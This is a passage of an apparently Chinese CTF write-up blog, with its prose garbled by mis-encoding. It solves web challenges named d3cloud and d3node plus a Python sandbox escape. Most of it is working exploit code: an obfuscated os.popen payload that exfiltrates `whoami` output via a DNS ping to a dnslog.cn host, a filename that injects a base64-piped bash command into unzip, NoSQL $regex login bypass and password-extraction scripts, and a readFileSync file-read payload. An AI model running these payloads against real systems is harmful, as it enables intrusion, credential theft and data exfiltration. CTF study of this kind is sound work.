class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shell:</span><br><span class="line">    s+=<span class="string">&quot;chr(&quot;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(i))+<span class="string">&quot;)+&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">payload = payload = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(s[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">payload1 = <span class="string">&quot;áµ‰xec(repr(request)[(len(black_char[len([])])&lt;&lt;(len(black_char[len([])])))|(len(black_char[len([])])&lt;&lt;(len(black_char[len([])])&lt;&lt;len(black_char[len([])])))|(len(black_char[len([])])&lt;&lt;(len(black_char[len([])])&lt;&lt;len(black_char[len([])])&lt;&lt;len(black_char[len([])])|len(black_char[len([])]))):len(repr(request))-int(black_char[len(black_char)-len(black_char[len([])])])])&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload1)</span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: base64.b64encode(payload1.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:5000/?&#x27;</span>+payload</span><br><span class="line">response=requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°æµ‹è¯•æ‰“è¿‡å»çš„<code>repr(request)</code>ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Request &quot;http://127.0.0.1:5000/?__import__(&#x27;os&#x27;).popen(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))&quot; [POST]&gt;139.196.153.118:31207</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repr(request)[èµ·å§‹ç´¢å¼•:ç»ˆæ­¢ç´¢å¼•]</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®payloadé•¿åº¦è°ƒè¯•èµ·å§‹ç´¢å¼•å³å¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">shell=<span class="string">&#x27;ping -c 1 `whoami`.jx0nsn.dnslog.cn&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shell:</span><br><span class="line">    s+=<span class="string">&quot;chr(&quot;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(i))+<span class="string">&quot;)+&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">payload = payload = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(s[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">payload1 = <span class="string">&quot;áµ‰xec(repr(request)[len(repr(request))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])]))-int(len(black_char[len([])])):len(repr(request))-int(black_char[len(black_char)-len(black_char[len([])])])])&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload1)</span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: base64.b64encode(payload1.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class="line">url=<span class="string">&#x27;http://139.196.153.118:31965/?&#x27;</span>+payload</span><br><span class="line"><span class="comment">#url=&#x27;http://127.0.0.1:5000/?&#x27;+payload</span></span><br><span class="line">response=requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230504150103889.png" alt="image-20230504150103889"></p>
<h2 id="Trueè½¬åŒ–æ•°å­—"><a href="#Trueè½¬åŒ–æ•°å­—" class="headerlink" title="Trueè½¬åŒ–æ•°å­—"></a>Trueè½¬åŒ–æ•°å­—</h2><p>Nu1L Team</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230503213933606.png" alt="image-20230503213933606"></p>
<h1 id="d3cloud"><a href="#d3cloud" class="headerlink" title="d3cloud"></a>d3cloud</h1><blockquote>
<p>admin uses laravel-admin to build a personal cloud disk, and adds a utility function</p>
</blockquote>
<p><code>http://139.196.153.118:32407/admin/auth/login</code></p>
<p>admin&#x2F;adminå¼±å¯†ç ç™»å½•</p>
<p>æ’ä»¶å‘ç° FilesystemAdapter.php</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230504194530062.png" alt="image-20230504194530062"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/illuminate/filesystem/blob/5.5/FilesystemAdapter.php">filesystem&#x2F;FilesystemAdapter.php at 5.5 Â· illuminate&#x2F;filesystem Â· GitHub</a></p>
<p>å¯¹æ¯”æºç ä»¥ä¸‹éƒ¨åˆ†ä¸å¤ªä¸€æ ·</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">putFileAs</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$file</span>, <span class="variable">$name</span>, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$supported_file</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;ico&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;mp4&#x27;</span>,<span class="string">&#x27;mp3&#x27;</span>,<span class="string">&#x27;mkv&#x27;</span>,<span class="string">&#x27;avi&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_type</span>= <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>,PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_type</span>, <span class="variable">$supported_file</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>(), <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(</span><br><span class="line">            <span class="variable">$path</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>), <span class="variable">$stream</span>, <span class="variable">$options</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$stream</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$fs</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;unzip -oq &quot;</span>. <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>() . <span class="variable">$name</span> .<span class="string">&quot; -d &quot;</span> . <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">pclose</span>(<span class="variable">$fs</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$path</span> : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯ä¸Šä¼ zipæ–‡ä»¶è‡ªåŠ¨è§£å‹æ“ä½œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$fs</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;unzip -oq &quot;</span>. <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>() . <span class="variable">$name</span> .<span class="string">&quot; -d &quot;</span> . <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">pclose</span>(<span class="variable">$fs</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°è¯•unzipå¤„å‘½ä»¤æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;echo Y2F0IC9mbDFBZyA+IC92YXIvd3d3L2h0bWwvcHVibGljL2ZsYWcudHh0|base64 -</span><br><span class="line">d|bash;.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230504204059817.png" alt="image-20230504204059817"></p>
<h1 id="d3node"><a href="#d3node" class="headerlink" title="d3node"></a>d3node</h1><blockquote>
<p>Enjoy the Node website :D</p>
<p>It will shows Internal Server Error at the beginning, please wait and refresh!</p>
</blockquote>
<p>æºä»£ç å¾—åˆ°hint1</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/getHint1" alt="img"></p>
<p>ä¸‡èƒ½å¯†ç ç™»å½•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password[$regex]=^.&amp;username=admin</span><br></pre></td></tr></table></figure>

<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230505111910306.png" alt="image-20230505111910306"></p>
<p>æœ‰äº›åŠŸèƒ½ç‚¹éœ€è¦adminæƒé™</p>
<p>å¯ä»¥ç›²æ³¨adminå¯†ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://localhost:8080&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://localhost:8080&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;http://139.196.153.118:31723/user/LoginIndex&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable[:-<span class="number">6</span>]:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>]:</span><br><span class="line">            payload = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&#x27;^&#x27;</span> + password + c</span><br><span class="line">             &#125;</span><br><span class="line">            r = requests.post(url=url, data=payload,allow_redirects=<span class="literal">False</span>,proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> r.status_code==<span class="number">302</span>:</span><br><span class="line">                <span class="built_in">print</span>(payload)</span><br><span class="line">                password += c</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>

<p>ç™»é™†åæºç ä¸­å¯ä»¥æ‰¾åˆ°htin2</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230504214948040.png" alt="image-20230504214948040"></p>
<p>è¿‡æ»¤äº†app.js,æ‰€ä»¥é€šè¿‡readFileSyncç‰¹æ€§ä¼ å…¥äºŒæ¬¡ç¼–ç app.jså¯¹è±¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename[origin]=*&amp;filename[href]=*&amp;filename[protocol]=file:&amp;filename[hostname]=&amp;filename[pathname]=a%2570p.js</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> stringRandom = <span class="built_in">require</span>(<span class="string">&quot;string-random&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// register router</span></span><br><span class="line"><span class="keyword">const</span> indexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/index&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> userRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/user&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> dashboardIndexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/dashboardIndex&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;hbs&#x27;</span>).<span class="property">__express</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">stringRandom</span>(<span class="number">32</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">        <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// set router</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>,indexRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/user&quot;</span>,userRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/dashboardIndex&quot;</span>,dashboardIndexRouter);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>,<span class="function">() =&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://139.196.153.118:31878/dashboardIndex/ShowExampleFile?filename[origin]=*&amp;filename[href]=*&amp;filename[protocol]=file:&amp;filename[hostname]=&amp;filename[pathname]=./routes/dashboardIndex.js</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦çœ‹</p>
